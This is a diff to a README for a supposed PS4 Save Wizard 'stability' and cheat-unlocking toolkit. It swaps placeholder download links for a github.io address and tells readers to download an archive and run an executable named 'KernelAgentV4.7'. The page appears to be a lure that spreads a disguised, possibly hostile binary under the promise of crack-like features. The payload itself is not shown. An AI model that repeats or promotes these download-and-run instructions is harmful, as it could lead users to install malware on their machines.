@@ -2,13 +2,15 @@
 
 This toolkit enhances PS4 Save Wizard by fixing crash issues, bypassing file recognition problems, and unlocking advanced cheat and region editing capabilities using `KernelAgentV4.7`.
 
-[![Download Save Wizard Fix](https://img.shields.io/badge/Download-PS4_Save_Wizard_Toolkit-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Save Wizard Fix](https://img.shields.io/badge/Download-PS4_Save_Wizard_Toolkit-blueviolet)](https://ps4-save-wizard-stability-enhancer.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ps4-save-wizard-stability-enhancer.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\SaveWizardFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will resolve software instability and unlock restricted cheat database access  
